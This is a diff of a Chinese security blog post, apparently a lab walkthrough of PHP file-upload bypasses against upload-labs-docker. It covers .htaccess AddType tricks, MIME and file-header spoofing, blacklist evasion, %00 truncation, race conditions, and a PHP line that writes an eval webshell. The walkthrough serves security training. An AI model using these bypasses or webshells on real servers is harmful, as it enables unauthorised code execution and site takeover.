@@ -7,15 +7,15 @@
 <meta name="full-screen" content="yes">
 <meta name="theme-color" content="#317EFB" />
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
-<meta name="description" content="基础知识：1、课前一定要明白：没有文件解析的安全问题，格式解析是一对一的（不能jpg解析php）换句话来说有解析错误配置或后缀解析漏洞的时候才能实现格式差异解析，图片格式解析为脚本格式 2、文件上传安全指的是攻击者通过利用上传实现后门的写入，连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中">
+<meta name="description" content="基础知识： 没有文件解析的安全问题，格式解析是一对一的（不能jpg解析php）换句话来说有解析错误配置或后缀解析漏洞的时候才能实现格式差异解析，图片格式解析为脚本格式  文件上传安全指的是攻击者通过利用上传实现后门的写入，连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP应用&amp;文件上传&amp;函数缺陷&amp;条件竞争&amp;二次渲染&amp;黑白名单&amp;JS绕过">
 <meta property="og:url" content="http://example.com/2024/03/24/Web%E6%94%BB%E9%98%B27/index.html">
 <meta property="og:site_name" content="Cypher Sun">
-<meta property="og:description" content="基础知识：1、课前一定要明白：没有文件解析的安全问题，格式解析是一对一的（不能jpg解析php）换句话来说有解析错误配置或后缀解析漏洞的时候才能实现格式差异解析，图片格式解析为脚本格式 2、文件上传安全指的是攻击者通过利用上传实现后门的写入，连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中">
+<meta property="og:description" content="基础知识： 没有文件解析的安全问题，格式解析是一对一的（不能jpg解析php）换句话来说有解析错误配置或后缀解析漏洞的时候才能实现格式差异解析，图片格式解析为脚本格式  文件上传安全指的是攻击者通过利用上传实现后门的写入，连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在">
 <meta property="og:locale">
 <meta property="article:published_time" content="2024-03-24T10:32:34.000Z">
-<meta property="article:modified_time" content="2024-03-25T10:38:20.478Z">
+<meta property="article:modified_time" content="2024-03-25T10:42:17.371Z">
 <meta property="article:author" content="Cypher Sun">
 <meta name="twitter:card" content="summary">
 
@@ -57,7 +57,7 @@
 
 <!-- Variable -->
 <script>window.ASYNC_CONFIG = {"hostname":"example.com","author":"Cypher Sun","root":"/","typed_text":["I`m a cybersecurity engineer","Welcome to my blog!"],"theme_version":"2.1.10","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":null,"icon16":null,"icon32":"favicon.ico","appleTouchIcon":null,"webmanifest":null,"visibilitychange":true,"hidden":"favicon.ico","showText":"骗你的~ (￣▽￣)ノ","hideText":"崩溃啦！(╯‵□′)╯︵┻━┻"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":true,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","user_tag":"fas fa-user-alt","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":"200px"},"toc":{"post_title":true},"live_time":{"start_time":"03/09/2024 15:46:00","prefix":"博客已萌萌哒运行 undefined 天"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
-<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-03-25 18:38:20"};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-03-25 18:42:17"};</script>
 
 <!-- Theme mode css -->
 <link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.1.10" id="trm-switch-style">
@@ -377,42 +377,46 @@
 </div>
 <div class="trm-card ">
     <article id="article-container" class="trm-publication">
-    <h2 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h2><p>1、课前一定要明白：<br>没有文件解析的安全问题，格式解析是一对一的（不能jpg解析php）<br>换句话来说有解析错误配置或后缀解析漏洞的时候才能实现格式差异解析，图片格式解析为脚本格式</p>
-<p>2、文件上传安全指的是攻击者通过利用上传实现后门的写入，连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在语言版本，语言函数，中间件，引用的第三方编辑器等存在缺陷地方配合利用。另外文件上传也有多个存储逻辑，不同的文件存储方案也会给攻击者带来不一样的挑战</p>
+    <h2 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h2><ol>
+<li><p>没有文件解析的安全问题，格式解析是一对一的（不能jpg解析php）<br>换句话来说有解析错误配置或后缀解析漏洞的时候才能实现格式差异解析，图片格式解析为脚本格式</p>
+</li>
+<li><p>文件上传安全指的是攻击者通过利用上传实现后门的写入，连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在语言版本，语言函数，中间件，引用的第三方编辑器等存在缺陷地方配合利用。另外文件上传也有多个存储逻辑，不同的文件存储方案也会给攻击者带来不一样的挑战</p>
+<br></li>
+</ol>
 <h2 id="测试环境安装参考："><a href="#测试环境安装参考：" class="headerlink" title="测试环境安装参考："></a>测试环境安装参考：</h2><p><a target="_blank" rel="noopener" href="https://github.com/ffffffff0x/f8x">https://github.com/ffffffff0x/f8x</a><br><a target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a><br><a target="_blank" rel="noopener" href="https://github.com/sqlsec/upload-labs-docker">https://github.com/sqlsec/upload-labs-docker</a><br>0、下载上述资源<br>1、docker安装<br>apt-get update<br>wget -O f8x <a target="_blank" rel="noopener" href="https://f8x.io/">https://f8x.io/</a><br>wget -O f8x <a target="_blank" rel="noopener" href="https://f8x.io/">https://f8x.io/</a> &amp;&amp; mv –force f8x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;f8x &amp;&amp; chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;f8x<br>f8x -d<br>git clone <a target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb.git">https://github.com/fuzzdb-project/fuzzdb.git</a> –depth 1<br>git clone <a target="_blank" rel="noopener" href="https://github.com/sqlsec/upload-labs-docker.git">https://github.com/sqlsec/upload-labs-docker.git</a><br>2、进入项目文件夹<br>cd upload-labs-docker<br>3、一键部署运行<br>docker-compose up -d<br>docker-compose config</p>
-<h2 id="upload-labs-docker知识点："><a href="#upload-labs-docker知识点：" class="headerlink" title="upload-labs-docker知识点："></a>upload-labs-docker知识点：</h2><p><strong>1、前端JS绕过问题</strong><br>如何判断是否是前端验证呢？<br>首先抓包，如果上传文件的时候还没有抓取到数据包，但是提示文件类型不正确的话，那么这个多半就是前端JS校验了，通过抓包，替换jpg为php即可绕过<br><br></p>
-<p><strong>2、.htaccess</strong>（中间件配置错误解析问题）<br>.htaccess是修改解析配置的文件<br>AddType application&#x2F;x-httpd-php .png<br>借助配置让.png文件帮助AddType application&#x2F;x-httpd-php当php执行<br>先随意上传然后抓包，修改上传文件名为.htaccess，内容为AddType application&#x2F;x-httpd-php .png。然后再上传png后门图片，既可进入绕过<br><br></p>
+<h2 id="upload-labs-docker知识点："><a href="#upload-labs-docker知识点：" class="headerlink" title="upload-labs-docker知识点："></a>upload-labs-docker知识点：</h2><p><strong>1、前端JS绕过问题</strong><br>如何判断是否是前端验证呢？<br>首先抓包，如果上传文件的时候还没有抓取到数据包，但是提示文件类型不正确的话，那么这个多半就是前端JS校验了，通过抓包，替换jpg为php即可绕过<br><br><br><br></p>
+<p><strong>2、.htaccess</strong>（中间件配置错误解析问题）<br>.htaccess是修改解析配置的文件<br>AddType application&#x2F;x-httpd-php .png<br>借助配置让.png文件帮助AddType application&#x2F;x-httpd-php当php执行<br>先随意上传然后抓包，修改上传文件名为.htaccess，内容为AddType application&#x2F;x-httpd-php .png。然后再上传png后门图片，既可进入绕过<br><br><br><br></p>
 <p><strong>3、MIME类型</strong><br>Content-Type：image&#x2F;png</p>
 <p>gif包<br>Content-Disposition: form-data; name&#x3D;”file”; filename&#x3D;”1.gif”<br>Content-Type: image&#x2F;gif</p>
 <p>php包<br>Content-Disposition: form-data; name&#x3D;”file”; filename&#x3D;”1.php”<br>Content-Type: application&#x2F;octet-stream</p>
 <p>png包<br>Content-Disposition: form-data; name&#x3D;”file”; filename&#x3D;”mind-map.png”<br>Content-Type: image&#x2F;png</p>
-<p>这个是检测你MIME类型的，先上传png格式，然后抓包修改文件1.png为1.php即可绕过<br>通过文件类型判断文件后缀<br><br></p>
+<p>这个是检测你MIME类型的，先上传png格式，然后抓包修改文件1.png为1.php即可绕过<br>通过文件类型判断文件后缀<br><br><br><br></p>
 <p><strong>4、文件头判断</strong><br>GIF89a是为gif头部开头<br>‰PNG是为PNG头部开头</p>
 <p>先通过010 editer在后门前面加上对应的文件头，上传后门后再修改对应的MIME类型，即可绕过</p>
-<p>通过文件头判断文件后缀<br><br></p>
+<p>通过文件头判断文件后缀<br><br><br><br></p>
 <p><strong>5、黑名单-过滤不严</strong><br>无递归逻辑，只检测一次，没有循环，pphphp</p>
 <p>上传1.pphphp即可绕过</p>
-<p>通过文件后缀判断文件后缀<br>1.黑名单<br>检测上传的文件后缀是不是在黑名单里<br>2.白名单<br>检测上传的文件后缀是不是在白名单里<br><br></p>
+<p>通过文件后缀判断文件后缀<br>1.黑名单<br>检测上传的文件后缀是不是在黑名单里<br>2.白名单<br>检测上传的文件后缀是不是在白名单里<br><br><br><br></p>
 <p><strong>6、黑名单-过滤不严</strong><br>系统大小写敏感属性</p>
 <p>上传1.phP即可绕过，window不区分大小写，linux区分大小写，需要特别注意</p>
-<p>通过文件后缀判断文件后缀<br><br></p>
+<p>通过文件后缀判断文件后缀<br><br><br><br></p>
 <p><strong>7、低版本PHP小于5.3.4，GET-%00截断</strong><br>自动解码一次<br>&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;x.php%00</p>
-<p>可以先做测试，repeater先发一个文件看看他返回的php版本<br>然后直接上传后门，抓包后缀修改为php，在第一排header写上POST &#x2F;?road&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;a.php%00<br>截断他后面默认的上传路径没就会把文件名替换为a.php，就可以绕过了<br><br></p>
+<p>可以先做测试，repeater先发一个文件看看他返回的php版本<br>然后直接上传后门，抓包后缀修改为php，在第一排header写上POST &#x2F;?road&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;a.php%00<br>截断他后面默认的上传路径没就会把文件名替换为a.php，就可以绕过了<br><br><br><br></p>
 <p><strong>8、低版本POST-%00截断</strong><br>手工解码一次<br>..&#x2F;upload&#x2F;a.php%00 二次解码</p>
 <p>可以先做测试，repeater先发一个文件看看他返回的php版本<br>然后直接上传后门，抓包后缀修改为php，在下面body写上.&#x2F;upload&#x2F;a.php%00，然后把%00进行convert selection ——&gt; url ——&gt; url decode，需要把%00进行url解码才能成功截断，和浏览器的解析有关系</p>
 <p>url上面的那个%00浏览器会自动解码一次</p>
-<p>但是在post下面的%00需要手动解码一次才能识别<br><br></p>
+<p>但是在post下面的%00需要手动解码一次才能识别<br><br><br><br></p>
 <p><strong>9、黑名单-过滤不严</strong><br>php3</p>
 <p>上传1.phP即可绕过，window不区分大小写，linux区分大小写，需要特别注意<br>可以使用fuzz里面的字典后缀去跑，看看哪个能绕过</p>
-<p>通过文件后缀判断文件后缀<br><br></p>
+<p>通过文件后缀判断文件后缀<br><br><br><br></p>
 <p><strong>10、逻辑不严-条件竞争</strong><br>访问即创建（访问就会触发代码，新建一个文件写后门）<br><?php fputs(fopen('xiao.php','w'),'<?php eval($_REQUEST[1]);?>‘);?&gt;</p>
 <p>上传不断发包<br>使用burp的intruder，然后使用null payload模式，continue infinitely</p>
 <p>请求不断发包<br>也是使用burp的intruder，然后使用null payload模式，continue infinitely</p>
-<p>错误逻辑：先上传，后判断<br>正确逻辑：先判断，后上传<br><br></p>
-<p><strong>11、二次渲染</strong><br>先搞个正常图片，上传导出渲染后的图片<br>对比保留部分，在保留部分添加后门代码<br>最后利用提示的文件包含执行图片后门代码<br><br></p>
+<p>错误逻辑：先上传，后判断<br>正确逻辑：先判断，后上传<br><br><br><br></p>
+<p><strong>11、二次渲染</strong><br>先搞个正常图片，上传导出渲染后的图片<br>对比保留部分，在保留部分添加后门代码<br>最后利用提示的文件包含执行图片后门代码<br><br><br><br></p>
 <p><strong>12、函数缺陷</strong><br>move_uploaded_file 函数漏洞</p>
 <p>1.php&#x2F;.</p>
-<p>保存为1.php&#x2F;.即可绕过<br><br></p>
+<p>保存为1.php&#x2F;.即可绕过<br><br><br><br></p>
 <p><strong>13、代码审计-数组绕过</strong><br>—————————–174283082921961<br>Content-Disposition: form-data; name&#x3D;”save_name[0]”</p>
 <p><a target="_blank" rel="noopener" href="http://2.php/">http://2.php/</a><br>—————————–174283082921961<br>Content-Disposition: form-data; name&#x3D;”save_name[2]”</p>
 <p>gif</p>
